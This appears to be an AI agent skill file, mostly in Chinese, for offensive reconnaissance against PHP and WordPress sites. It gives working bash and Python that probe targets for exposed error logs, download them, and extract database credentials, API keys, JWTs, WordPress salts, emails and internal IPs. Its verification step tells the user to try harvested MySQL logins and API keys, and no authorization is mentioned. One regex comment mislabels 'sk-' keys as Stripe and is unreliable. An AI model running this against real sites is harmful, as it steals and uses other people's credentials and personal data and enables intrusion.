---
name: error-log-mining
description: 在泄漏排查发现线索时，从 error_log 中挖掘凭据、路径与 SQL。
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
compatibility: Requires curl, grep, python3
metadata:
  tags: [recon, error-log, credentials, wordpress, data-mining]
  category: recon
  related_skills:
    - deep-invade
    - source-leak-hunt
    - phpinfo-to-rce
    - wordpress-full-compromise
---

# 错误日志挖掘技能

发现并分析已暴露的 PHP `error_log` 文件，以获取服务器路径、数据库错误、SQL 片段、
API 密钥候选、邮箱地址与内部地址。收集有界样本并验证其内容的敏感性，而不是仅凭文件
大小或状态码推断影响。

## When to Use

- 对高价值目标运行 `deep-invade` 阶段 2 时。
- `skill_view(name='source-leak-hunt')` 发现了一个返回 HTTP 200 的 `error_log` 文件。
- 目标使用 PHP（WordPress、Laravel、定制 PHP），且 `display_errors` 可能已开启。
- 在尝试利用前，你需要服务端上下文（路径、数据库结构）。

## Prerequisites

- 带 curl、grep 和 python3 的 `terminal`。
- 在常见路径上可能存在 error_log 的目标 URL。
- 磁盘空间：错误日志可能达到数 GB。对大型文件使用 `curl -r` 发起范围请求。

## How to Run

```bash
TARGET="https://example.com"

# Paths to probe
for path in "error_log" "wp-content/debug.log" "debug.log" "errors.log" \
  "php_errors.log" "wp-content/error.log" "logs/error.log"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 "$TARGET/$path")
  [[ "$code" == "200" ]] && echo "FOUND: $TARGET/$path"
done

# Download and analyze
curl --max-time 30 --connect-timeout 10 -sk "$TARGET/error_log" -o error_log.txt
python3 analyze_log.py error_log.txt
```

## 快速参考

| 提取目标 | Python 正则 | 价值 |
|------------------|--------------------------------------|-------|
| 服务器路径 | `re.findall(r'/home/[^\s:)]+', txt)` | 完整目录结构 |
| 邮箱地址 | `re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', txt)` | 管理员邮箱 |
| 数据库凭据 | `DB_USER[^=]*=[\s'\"]*([^'\";\s]+)` `DB_PASSWORD[^=]*=[\s'\"]*([^'\";\s]+)` `DB_HOST[^=]*=[\s'\"]*([^'\";\s]+)` `DB_NAME[^=]*=[\s'\"]*([^'\";\s]+)` | 数据库访问 |
| API 密钥 | `sk-[a-zA-Z0-9]{20,60}` `AIza[0-9A-Za-z_-]{35}` `AKIA[0-9A-Z]{16}` `eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}` | Stripe、Google、AWS、JWT |
| SQL 查询 | `(?:SELECT\|INSERT\|UPDATE\|DELETE\|CREATE TABLE\|ALTER TABLE)[^;]{0,300}` | 数据库结构、表名 |
| WordPress salts | `(?:AUTH_KEY\|SECURE_AUTH_KEY\|LOGGED_IN_KEY\|NONCE_KEY\|AUTH_SALT\|SECURE_AUTH_SALT\|LOGGED_IN_SALT\|NONCE_SALT)[^,;]+` | 会话劫持可能性 |
| PHP 错误类型 | `Counter(re.findall(r'PHP\s+\w+:', txt)).most_common(10)` | 错误分布 |
| 日期范围 | `re.findall(r'\[(\d{2}-\w{3}-\d{4})', txt)` | 日志新鲜度 |

## Procedure

### 步骤 1 — 发现错误日志位置

```bash
TARGET="$1"
OUTDIR="$OUTDIR/error_logs/$TARGET"
mkdir -p "$OUTDIR"

echo "[*] Probing common error log paths on $TARGET..."

ERROR_LOG_PATHS=(
  "error_log"
  "wp-content/debug.log"
  "debug.log"
  "errors.log"
  "php_errors.log"
  "wp-content/error.log"
  "logs/error.log"
  "log/error.log"
  "tmp/php-errors.log"
  "wp-content/plugins/debug.log"
  "wp-content/themes/debug.log"
)

FOUND_LOGS=()

for path in "${ERROR_LOG_PATHS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 "https://$TARGET/$path" 2>/dev/null)

  if [[ "$code" == "200" ]]; then
    # Quick content check to avoid SPA false positives
    sample=$(curl -sk --max-time 5 --connect-timeout 5 -r 0-500 "https://$TARGET/$path" 2>/dev/null)
    if echo "$sample" | grep -qiE 'PHP|Error|Warning|Stack trace|\[[0-9]{2}-[A-Za-z]{3}-[0-9]{4}'; then
      echo "[FOUND] https://$TARGET/$path"
      FOUND_LOGS+=("https://$TARGET/$path")
    fi
  fi
  sleep 0.3
done

echo "[+] Found ${#FOUND_LOGS[@]} error log(s)"
```

### 步骤 2 — 下载并采样大型日志

```bash
TARGET="$1"
OUTDIR="$OUTDIR/error_logs/$TARGET"

for url in "${FOUND_LOGS[@]}"; do
  fname=$(echo "$url" | sed 's|https\?://||' | sed 's|/|_|g')

  echo "[*] Downloading $url..."

  # First, check file size
  size=$(curl -skI --max-time 10 --connect-timeout 10 "$url" 2>/dev/null | grep -i "content-length" | awk '{print $2}' | tr -d '\r')

  if [[ -n "$size" && "$size" -gt 10000000 ]]; then
    echo "  Large file (${size} bytes) — sampling first 5MB..."
    curl -sk --max-time 30 --connect-timeout 10 -r 0-5000000 "$url" -o "$OUTDIR/${fname}_sample.txt" 2>/dev/null
  elif [[ -n "$size" && "$size" -gt 1000000 ]]; then
    echo "  Medium file (${size} bytes) — downloading full..."
    curl -sk --max-time 30 --connect-timeout 10 "$url" -o "$OUTDIR/${fname}.txt" 2>/dev/null
  else
    echo "  Small file — downloading full..."
    curl -sk --max-time 15 --connect-timeout 10 "$url" -o "$OUTDIR/${fname}.txt" 2>/dev/null
  fi
  sleep 0.5
done
```

### 步骤 3 — 提取情报

```bash
TARGET="$1"
OUTDIR="$OUTDIR/error_logs/$TARGET"

for logfile in "$OUTDIR"/*.txt "$OUTDIR"/*_sample.txt; do
  [[ ! -f "$logfile" ]] && continue

  echo ""
  echo "═══════════ $(basename "$logfile") ═══════════"
  echo ""

  # 1. Server Paths
  echo "[SERVER PATHS]"
  grep -Eo '(/[a-zA-Z0-9_/.-]+\.php)' "$logfile" 2>/dev/null | sort -u | head -20

  # 2. Email Addresses
  echo ""
  echo "[EMAIL ADDRESSES]"
  grep -Eo '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' "$logfile" 2>/dev/null | sort -u | head -15

  # 3. Database Credentials
  echo ""
  echo "[DB CREDENTIALS & CONNECTIONS]"
  grep -iE 'mysql_connect|mysqli_connect|new PDO|pg_connect|DB_HOST|DB_USER|DB_PASSWORD|DB_NAME|database.*password|dsn.*mysql' "$logfile" 2>/dev/null | head -10

  # 4. SQL Queries
  echo ""
  echo "[SQL QUERIES]"
  grep -iE '(SELECT|INSERT|UPDATE|DELETE|CREATE TABLE|ALTER TABLE|DROP TABLE).*(FROM|INTO|SET)' "$logfile" 2>/dev/null | head -10

  # 5. API Keys & Tokens
  echo ""
  echo "[API KEYS & TOKENS]"
  grep -iE 'api[_-]?key|api[_-]?secret|access[_-]?token|auth[_-]?token|bearer [A-Za-z0-9_\-]{20,}|sk-[A-Za-z0-9]{20,}|key=[A-Za-z0-9]{20,}' "$logfile" 2>/dev/null | head -10

  # 6. Internal IPs
  echo ""
  echo "[INTERNAL IPs]"
  grep -Po '(?:10\.|172\.(?:1[6-9]|2[0-9]|3[01])\.|192\.168\.)\d{1,3}\.\d{1,3}' "$logfile" 2>/dev/null | sort -u | head -10

  # 7. WordPress specific
  echo ""
  echo "[WORDPRESS PATHS]"
  grep -Po '/wp-content/(?:plugins|themes|uploads)/[a-zA-Z0-9_/.-]+' "$logfile" 2>/dev/null | sort -u | head -15

  # 8. PHP Error Summary
  echo ""
  echo "[ERROR SUMMARY]"
  echo "  Fatal errors:    $(grep -ci 'Fatal error' "$logfile" 2>/dev/null || echo 0)"
  echo "  Warnings:        $(grep -ci 'Warning' "$logfile" 2>/dev/null || echo 0)"
  echo "  Notices:         $(grep -ci 'Notice' "$logfile" 2>/dev/null || echo 0)"
  echo "  Parse errors:    $(grep -ci 'Parse error' "$logfile" 2>/dev/null || echo 0)"
  echo "  Deprecated:      $(grep -ci 'Deprecated' "$logfile" 2>/dev/null || echo 0)"
  echo "  Stack traces:    $(grep -ci 'Stack trace' "$logfile" 2>/dev/null || echo 0)"

  # 9. Date Range
  echo ""
  echo "[DATE RANGE]"
  first=$(grep -Eo '\[[0-9]{2}-[A-Za-z]{3}-[0-9]{4} [0-9]{2}:[0-9]{2}:[0-9]{2}[^\]]*\]' "$logfile" 2>/dev/null | head -1)
  last=$(grep -Eo '\[[0-9]{2}-[A-Za-z]{3}-[0-9]{4} [0-9]{2}:[0-9]{2}:[0-9]{2}[^\]]*\]' "$logfile" 2>/dev/null | tail -1)
  [[ -n "$first" ]] && echo "  First: $first"
  [[ -n "$last" ]] && echo "  Last:  $last"

  # 10. Plugin/Theme Names from Paths
  echo ""
  echo "[PLUGINS FROM ERRORS]"
  grep -Po '/wp-content/plugins/\K[a-zA-Z0-9_-]+' "$logfile" 2>/dev/null | sort -u | head -20

  echo ""
  echo "[THEMES FROM ERRORS]"
  grep -Po '/wp-content/themes/\K[a-zA-Z0-9_-]+' "$logfile" 2>/dev/null | sort -u | head -10
  sleep 0.3
done
```

### 步骤 4 — 提取可操作情报

```bash
TARGET="$1"
OUTDIR="$OUTDIR/error_logs/$TARGET"
SUMMARY="$OUTDIR/intel_summary.md"

cat > "$SUMMARY" << EOF
# Error Log Intelligence — $TARGET

## Credentials Found
EOF

for logfile in "$OUTDIR"/*.txt "$OUTDIR"/*_sample.txt; do
  [[ ! -f "$logfile" ]] && continue

  # DB credentials
  grep -iE 'DB_HOST|DB_USER|DB_PASSWORD|DB_NAME' "$logfile" 2>/dev/null | while read -r line; do
    echo "- $line" >> "$SUMMARY"
  done

  # API keys
  grep -iE 'api[_-]?key.*=|api[_-]?secret.*=|access[_-]?token.*=' "$logfile" 2>/dev/null | while read -r line; do
    echo "- $line" >> "$SUMMARY"
  done
done

echo "" >> "$SUMMARY"
echo "## Server Paths" >> "$SUMMARY"
grep -Eo '/[a-zA-Z0-9_/.-]+\.php' "$OUTDIR"/*.txt 2>/dev/null | sort -u | head -30 | while read -r line; do
  echo "- $line" >> "$SUMMARY"
done

echo "" >> "$SUMMARY"
echo "## Email Addresses" >> "$SUMMARY"
grep -Eo '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' "$OUTDIR"/*.txt 2>/dev/null | sort -u | while read -r line; do
  echo "- $line" >> "$SUMMARY"
done

echo "" >> "$SUMMARY"
echo "## Plugins Discovered" >> "$SUMMARY"
grep -Po '/wp-content/plugins/\K[a-zA-Z0-9_-]+' "$OUTDIR"/*.txt 2>/dev/null | sort -u | while read -r line; do
  echo "- $line" >> "$SUMMARY"
done

echo ""
echo "[+] Intelligence summary saved to $SUMMARY"
```

### 步骤 5 — 与其他发现交叉比对

```bash
# Does error log reveal the DB name? Cross-ref with wp-config leak
DB_NAME=$(grep -Po 'DB_NAME["\x27\s:=]+["\x27][a-zA-Z0-9_]+' $OUTDIR/error_logs/*/intel_summary.md 2>/dev/null)
echo "DB name from logs: $DB_NAME"

# Does it reveal internal hostnames?
HOSTNAMES=$(grep -Po '(?:[a-zA-Z0-9-]+\.(?:internal|local|lan|corp|priv))' $OUTDIR/error_logs/*/*.txt 2>/dev/null | sort -u)
[[ -n "$HOSTNAMES" ]] && echo "Internal hostnames:" && echo "$HOSTNAMES"

# Are there file inclusion paths that indicate LFI potential?
LFI_PATHS=$(grep -Po '(?:include|require|include_once|require_once)\s*\(\s*[\x27"]([^\x27"]+\.php)' $OUTDIR/error_logs/*/*.txt 2>/dev/null | sort -u)
[[ -n "$LFI_PATHS" ]] && echo "Potential LFI paths:" && echo "$LFI_PATHS"
```

## 有界日志挖掘器

```python
import re
from collections import Counter

def mine_error_log(txt):
    results = {}

    # Server paths
    results['paths'] = sorted(set(re.findall(r'/home/[^\s:)]+', txt)))[:20]

    # Email addresses
    results['emails'] = sorted(set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', txt)))[:20]

    # DB credentials (4 patterns extracted from php error context)
    db_creds = set()
    for pat in [r"DB_USER[^=]*=[\s'\"]*([^'\";\s]+)",
                r"DB_PASSWORD[^=]*=[\s'\"]*([^'\";\s]+)",
                r"DB_HOST[^=]*=[\s'\"]*([^'\";\s]+)",
                r"DB_NAME[^=]*=[\s'\"]*([^'\";\s]+)"]:
        for m in re.findall(pat, txt): db_creds.add(m)
    results['db_creds'] = sorted(db_creds)

    # API keys (5 pattern classes — all extracted from error context)
    api_keys = set()
    for pat in [r'sk-[a-zA-Z0-9]{20,60}',           # Stripe
                r'AIza[0-9A-Za-z_-]{35}',            # Google
                r'AKIA[0-9A-Z]{16}',                  # AWS IAM
                r'pk_[a-zA-Z0-9]+',                   # Publishable keys
                r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}']:  # JWT
        for m in re.findall(pat, txt): api_keys.add(m)
    results['api_keys'] = sorted(api_keys)[:10]

    # SQL queries
    results['sql_queries'] = re.findall(
        r'(?:SELECT|INSERT|UPDATE|DELETE|CREATE TABLE|ALTER TABLE)[^;]{0,300}',
        txt, re.I)[:10]

    # WordPress salts (session hijack potential)
    results['wp_salts'] = re.findall(
        r"(?:AUTH_KEY|SECURE_AUTH_KEY|LOGGED_IN_KEY|NONCE_KEY|AUTH_SALT|SECURE_AUTH_SALT|LOGGED_IN_SALT|NONCE_SALT)[^,;]+",
        txt)

    # Error type breakdown
    results['error_types'] = Counter(re.findall(r'PHP\s+\w+:', txt)).most_common(10)

    # Date range
    dates = re.findall(r'\[(\d{2}-\w{3}-\d{4})', txt)
    if dates:
        results['date_range'] = f"{dates[0]} to {dates[-1]} ({len(set(dates))} unique dates)"

    return results
```

## Pitfalls

- **错误日志可能非常大。** 下载前检查 `Content-Length`，并使用有界范围如
  `curl -r 0-5000000` 进行初步采样。
- **日志可能包含个人身份信息（PII）。** 错误日志中的邮箱地址、IP 和用户名可能构成数据泄露。请负责任地处理。
- **日志轮换可能导致截断。** 可见的 error_log 可能只包含近期记录。检查是否存在轮换日志（`error_log.1`、`error_log.old`、`error_log-YYYYMMDD`）。
- **某些主机会返回无意义内容。** `/error_log` 返回 200 可能只是一个自定义 404 页面或 SPA 兜底路由。分析前始终检查内容是否匹配 `PHP ` + 错误类型模式。
- **旧日志 ≠ 当前漏洞。** 一份 2013 年的错误日志并不意味着当前站点存在漏洞。将日志时间线与服务器技术栈交叉比对。

## Verification

- 错误日志必须包含 PHP 错误模式（`[date] PHP Warning:`、`Stack trace:`、`Fatal error:`）才算有效。
- 每条提取出的凭据都必须验证有效性（尝试 MySQL 连接、验证 API 密钥）。
- 服务器路径必须与已知目录结构相符（例如 `/home/user/public_html/`）。
- 为报告记录错误日志 URL、文件大小、日期范围和关键发现。
- 错误日志中的 API 密钥几乎总是生产密钥（不同于 JS 打包文件中的密钥，后者通常受限）。
